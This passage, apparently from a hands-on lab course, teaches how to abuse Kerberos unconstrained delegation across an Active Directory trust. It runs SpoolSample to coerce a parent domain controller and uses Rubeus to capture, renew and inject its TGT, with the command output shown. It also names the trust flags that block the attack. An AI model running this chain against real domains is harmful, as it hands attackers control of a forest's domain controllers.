Kerberos unconstrained delegations could be abused across trusts to take control over any resource of the trusting domain, including the domain controller, as long as the trusted domain is compromised. This relies on the delegation of TGT across trusts, which can be disabled. If TGT delegation is disabled in a trust, attackers won't be able to [escalate from one domain to another by abusing unconstrained delegation](https://www.thehacker.recipes/ad/movement/trusts/index#unconstrained-delegation-abuse). On a side note, the other types of delegations are not affected by this as they don't rely on the delegation of tickets, but on S4U extensions instead.

The TGT delegation status of a trust depends on the [trustAttributes](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e9a2d23c-c31e-4a6f-88a0-6646fdb51a3c) flags of a [TDO](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_f2ceef4e-999b-4276-84cd-2e2829de5fc4).

> - If the `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_NO_TGT_DELEGATION (0x00000200)` flag is set, then TGT Delegation is disabled.
> - If the `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN (0x00000004)` flag is set, then TGT Delegation is disabled.
> - If the `TRUST_ATTRIBUTE_CROSS_ORGANIZATION_ENABLE_TGT_DELEGATION (0x00000800)`flag is set, then TGT Delegation is enabled.
> - If the `TRUST_ATTRIBUTE_WITHIN_FOREST (0x00000020)` flag is set, then TGT Delegation is enabled.
> 
> _(by_ [_Carsten Sandker_](https://twitter.com/0xcsandker) _on_ [_www.securesystems.de_](https://www.securesystems.de/blog/active-directory-spotlight-trusts-part-2-operational-guidance/)_)_


![Active Directory Users and Computers window showing properties for DC02. The "Delegation" tab is selected with the option "Trust this computer for delegation to any service (Kerberos only)" enabled.|734](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/Unconstrained_delegation_1.png)


### Performing the Attack

![Diagram illustrating an attack using the "printer bug" between DC02 (Child DC) and DC01 (Parent DC). Steps include authentication requests, TGT extraction, and DCsync, exploiting unconstrained delegation and two-way transitive trust.|745](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/253/UD_IF.png)

Let's execute `Rubeus` to monitor stored tickets. If a `Ticket Granting Ticket (TGT)` is discovered within a `Ticket Granting Service (TGS)` ticket, Rubeus will promptly display it to us, enabling us to identify any potential security risks or access attempts within the environment.






## Exploitation steps


Subsequently, we can execute SpoolSample to exploit the printer bug, forcing DC01 (the Parent DC) to authenticate to a host under our control, which in this case is DC02 (the Child DC). By leveraging this exploit, we can trigger an authentication attempt from the Parent DC to the Child DC, thereby facilitating the interception of DC01's Ticket Granting Ticket (TGT).The syntax for this tool is SpoolSample.exe (target server) (capture server), where the target server in our example lab is DC01 (Parent DC) and the capture server is DC02 (Child DC).



```python
c:\Tools>.\spoolsample.exe dc01.inlanefreight.ad dc02.dev.inlanefreight.ad
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
TargetServer: \\dc01.inlanefreight.ad, CaptureServer: \\dc02.dev.inlanefreight.ad
Attempted printer notification and received an invalid handle. The coerced authentication probably worked!
```



```python
c:\Tools>.\Rubeus.exe monitor /interval:5 /nowrap /targetuser:DC01$

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: TGT Monitoring
[*] Target user     : DC01$
[*] Monitoring every 5 seconds for new TGTs


[*] 1/27/2026 4:26:08 PM UTC - Found new TGT:

  User                  :  DC01$@INLANEFREIGHT.AD
  StartTime             :  1/27/2026 10:13:53 AM
  EndTime               :  1/27/2026 8:13:53 PM
  RenewTill             :  2/3/2026 10:13:53 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIF[...SNIP...]uQUQ=

[*] Ticket cache size: 1

```




```python
C:\Tools>.\Rubeus.exe renew /ticket:doIFvD[...snip...]FQuQUQ= /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Renew Ticket

[*] Using domain controller: DC01.INLANEFREIGHT.AD (172.16.210.99)
[*] Building TGS-REQ renewal for: 'INLANEFREIGHT.AD\DC01$'
[+] TGT renewal request successful!
[*] base64(ticket.kirbi):

      d[..SNIP..]Q=
[+] Ticket successfully imported!

```











